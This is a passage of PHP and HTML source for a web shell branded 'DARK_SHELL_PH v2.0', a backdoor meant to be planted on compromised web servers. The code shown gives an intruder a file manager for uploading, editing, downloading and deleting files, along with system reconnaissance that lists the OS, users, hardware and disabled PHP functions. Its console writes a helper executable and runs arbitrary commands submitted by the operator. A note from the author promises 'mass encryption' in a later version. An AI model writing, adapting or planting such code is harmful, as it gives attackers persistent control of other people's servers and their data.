                                <input type="text" name="new_name" placeholder="Directory name">
                                <button type="submit">CREATE DIR</button>
                            </form>
                        </div>
                    </div>
                    <div class="left">
                        <div class="toolbar">
                            <form method="POST" enctype="multipart/form-data" style="flex:3;">
                                <input type="hidden" name="action" value="upload">
                                <input type="file" name="file">
                                <button type="submit">UPLOAD</button>
                            </form>
                        </div>
                    </div>
                </div>
                <div class="toolbar" style="font-size: 12px;">
                    <span style="color: #00ff00;">Disabled Functions:</span>
                        <?php
                        $disabled = ini_get("disable_functions");
                        if (empty($disabled)) {
                            echo "No disabled functions";
                        } else {
                            $arr = array_filter(array_map('trim', explode(',', $disabled)));

                            for ($i = 0; $i < count($arr); $i++) {
                                echo htmlspecialchars($arr[$i]) . " ";
                                if (($i + 1) % 4 === 0) {
                                    echo "<br>";
                                }
                            }
                        }
                        ?>
                </div>

            </div>
            <div class="right">
                <div class="sysinfo-title">[ SYSTEM INFORMATION ]</div>
                <div class="sysinfo-compact">
                    <div class="row">
                        <span class="label">OS</span>
                        <span class="value"><?= htmlspecialchars(substr(getOS(), 0, 30)) ?></span>
                    </div>
                    <div class="row">
                        <span class="label">User</span>
                        <span class="value"><?= htmlspecialchars(getUserInfo()) ?></span>
                    </div>
                    <div class="row">
                        <span class="label">CPU</span>
                        <span class="value"><?= htmlspecialchars(substr($cpu["model"], 0, 20) . " ({$cpu["cores"]}c)") ?></span>
                    </div>
                    <div class="row">
                        <span class="label">RAM</span>
                        <span class="value"><?= htmlspecialchars(formatBytes($mem["used"] * 1024) . " / " . formatBytes($mem["total"] * 1024)) ?></span>
                    </div>
                    <div class="row">
                        <span class="label">Uptime</span>
                        <span class="value"><?= htmlspecialchars(getUptime()) ?></span>
                    </div>
                    <div class="row">
                        <span class="label">Disk</span>
                        <span class="value"><?= htmlspecialchars(formatBytes($disk["used"]) . " / " . formatBytes($disk["total"])) ?></span>
                    </div>
                    <div class="row">
                        <span class="label">Server</span>
                        <span class="value"><?= htmlspecialchars(getServerSoftware()) ?></span>
                    </div>
                    <div class="row">
                        <span class="label">PHP</span>
                        <span class="value"><?= htmlspecialchars(getPHPVersion()) ?></span>
                    </div>
                </div>
            </div>
        </div>
        <?php elseif (isset($_GET['console'])): ?>

        <div class="container-inside">
            <?php $users = getLoggedInUsers(); ?>
            <div class="left" style="padding: 5px;padding-bottom: 0px;">
                <div class="toolbar" style="font-size: 12px;display:flex;justify-content:center;align-items:center;">RAM: <span style="color:#00ff00"><?= formatBytes($mem["used"] * 1024) ." / " .formatBytes($mem["total"] * 1024) ?></span></div>
            </div>
            <div class="left" style="padding: 5px;padding-bottom: 0px;">
                <div class="toolbar" style="font-size: 12px;display:flex;justify-content:center;align-items:center;">Uptime: <span style="color:#00ff00"><?= getUptime() ?></span></div>
            </div>
            <div class="left" style="padding: 5px;padding-bottom: 0px;">
                <div class="toolbar" style="font-size: 12px;display:flex;justify-content:center;align-items:center;">Disk: <span style="color:#00ff00"><?= formatBytes($disk["used"]) ." / " .formatBytes($disk["total"]) ?></span></div>
            </div>
            <div class="left" style="padding: 5px;padding-bottom: 0px;">
                <div class="toolbar" style="font-size: 12px;display:flex;justify-content:center;align-items:center;">Active Users: <span style="color:#00ff00"><?= empty($users) ? "0" : implode(", ", $users); ?></span></div>
            </div>
        </div>

        <?php
        $execFile = writeExecutable();
        $scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
        $url = $scheme . '://' . $_SERVER['HTTP_HOST'] . rtrim(dirname($_SERVER['SCRIPT_NAME']), '/') . '/' . $execFile;

        if (checkHeader($url)) {
            if (isset($_POST["cmd"]) && $logged_in && $key_valid) {
                $cmd = trim($_POST["cmd"]);

                if (preg_match('/^cd\s*(.*)$/', $cmd, $m)) {
                    $target = trim($m[1]);

                    if ($target === '' || $target === '~') {
                        $newDir = getenv('HOME') ?: $dir;
                    } elseif ($target[0] === '/') {
                        $newDir = $target;
                    } else {
                        $newDir = rtrim($dir, '/') . '/' . $target;
                    }

                    $real = realpath($newDir);

                    if ($real !== false && is_dir($real)) {
                        $dir = str_replace("\\", "/", $real);
                    }

                    $cmd_output = [];
                } else {
                    $final = "cd " . $dir . ";" . $cmd;
                    $cmd_output = triggerExecutable($final, $url, $execFile);
                }
            }
        } else {
            $cmd_output = "Failed to execute command\nURL: " . $url;
        }
        ?>
        <div class="container-inside">
            <div class="left" style="flex: 2;">
                <div class="toolbar">
                    Executing command at this URL: <span style="color: #00ff00"><?= $url . "?cmd={command}"; ?></span>
                </div>
                <?php if (!empty($cmd_output)): ?>
                    <div class="output">
                        <pre><?= $cmd_output; ?></pre>
                    </div>
                <?php endif; ?>
            </div>
            <div class="right">
                <pre><?php echo tree($dir); ?></pre>
            </div>
        </div>

        <div class="container-inside">
            <form method="POST" class="cmd-line">
                <input type="hidden" name="d" value="<?= htmlspecialchars(b64_encode_native($dir)) ?>">
                <input type="text" id="cmd" name="cmd" placeholder="Enter command..." value="<?php echo isset($_POST["cmd"]) ? htmlspecialchars($_POST["cmd"]) : ""; ?>" autocomplete="off" autofocus><button type="submit">EXEC</button>
            </form>
        </div>
        <?php elseif (isset($_GET['encrypt'])): ?>
        <div class="container-inside">
            <div class="left">
                <div class="toolbar">
                    Mass encryption to be added in v1.1, let's have a chat while I make the new features! TG: @seveishere
                    <br>
                    <br>
                    - 0xSeve
                </div>
            </div>
        </div>
        <?php endif;?>

        <!-- Edit/Rename Views -->
        <?php if (isset($_GET["edit"])): ?>
            <h3 style="color:#00ff00; margin:10px 0;">EDIT: <?php echo htmlspecialchars(basename($edit_file)); ?></h3>
            <form method="POST">
                <input type="hidden" name="action" value="edit_save">
                <input type="hidden" name="path" value="<?php echo htmlspecialchars($edit_file); ?>">
                <textarea name="content" class="edit-area"><?php echo htmlspecialchars($file_content); ?></textarea>
                <div style="display:flex; gap:10px;">
                    <button type="submit">SAVE</button>
                    <a href="?d=<?php echo b64_encode_native($dir); ?>" class="btn">CANCEL</a>
                </div>
            </form>
        <?php elseif (isset($_GET["rename"])): ?>
            <h3 style="color:#00ff00; margin:10px 0;">RENAME: <?php echo htmlspecialchars(basename($rename_file)); ?></h3>
            <form method="POST">
                <input type="hidden" name="action" value="rename">
                <input type="hidden" name="path" value="<?php echo htmlspecialchars($rename_file); ?>">
                <div style="display:flex; gap:10px; max-width:400px;">
                    <input type="text" name="new_name" class="cmd-line" style="color: white;" value="<?php echo htmlspecialchars(basename($rename_file)); ?>" required>
                </div>
                <div class="btn-group">
                        <button type="submit">RENAME</button>
                        <button onclick="window.location.href='?d=<?php echo b64_encode_native($dir); ?>'" class="btn">CANCEL</button>
                </div>
            </form>
        <?php endif; ?>

        <!-- File Listing -->
        <?php if (!isset($_GET["edit"]) && !isset($_GET["rename"]) && !isset($_GET['console']) && !isset($_GET['encrypt'])): ?>
            <table>
                <thead>
                    <tr>
                        <th>Type</th>
                        <th>Name</th>
                        <th>Size</th>
                        <th>Owner</th>
                        <th>Perms</th>
                        <th>Last Modified</th>
                        <th>Actions</th>
                    </tr>
                </thead>
                <tbody>
                    <?php
                    $parent = dirname($dir);
                    if ($parent != $dir) {
                        echo '<tr class="dir-row">';
                        echo "<td>DIR</td>";
                        echo '<td colspan="4"><a href="?d=' . b64_encode_native($parent) . '">[ .. ]</a></td>';
                        echo "<td></td><td></td></tr>";
                    }

                    $items = @scandir($dir);
                    if ($items !== false) {
                        foreach ($items as $item) {
                            if ($item == "." || $item == "..") {
                                continue;
                            }

                            $path = $dir . $item;
                            $is_dir = is_dir($path);
                            $last_modified = getFileLastModified($path);
                            $owner = getFileOwnerFull($path);
                            $size = $is_dir ? "-" : format_size(filesize($path));
                            $perms = getPermission($path);

                            echo '<tr class="' . ($is_dir ? "dir-row" : "file-row") . '">';
                            echo "<td>" . ($is_dir ? "DIR" : "FILE") . "</td>";

                            if ($is_dir) {
                                echo '<td><a href="?d=' . b64_encode_native($path) . '">[' . htmlspecialchars($item) . "]</a></td>";
                            } else {
                                echo "<td>" . htmlspecialchars($item) . "</td>";
                            }

                            echo "<td>" . $size . "</td>";
                            echo "<td>" . $owner . "</td>";
                            echo "<td>" . $perms . "</td>";
                            echo "<td>" . $last_modified . "</td>";
                            echo '<td class="actions">';

                            echo '<a href="?rename=' . b64_encode_native($path) . "&d=" . b64_encode_native($dir) . '">rename</a>';

                            if (!$is_dir) {
                                echo '<a href="?edit=' . b64_encode_native($path) . "&d=" . b64_encode_native($dir) . '">edit</a>';
                                echo '<a href="?download=' . b64_encode_native($path) . '">dl</a>';
                            }

                            echo '<form method="POST" class="delete-form" onsubmit="return confirm(\'Delete?\');">';
                            echo '<input type="hidden" name="action" value="delete">';
                            echo '<input type="hidden" name="path" value="' . htmlspecialchars($path) . '">';
                            echo '<button type="submit" class="delete-btn">del</button>';
                            echo "</form></td></tr>";
                        }
                    } else {
                        echo '<tr><td colspan="5" style="text-align:center;">Access Denied</td></tr>';
                    }
                    ?>
                </tbody>
            </table>
        <?php endif; ?>

        <div class="footer">
            [ DARK_SHELL_PH v2.0 ] - Dark Shell Operations | Underground Security
        </div>
    </div>
    <script>
        // Prevent form resubmission
        if (window.history.replaceState) {
            window.history.replaceState(null, null, window.location.href);
        }

        window.onload = () => {
            const el = document.getElementById("cmd");
            el.focus();
            el.setSelectionRange(el.value.length, el.value.length);
        };
    </script>
</body>
</html>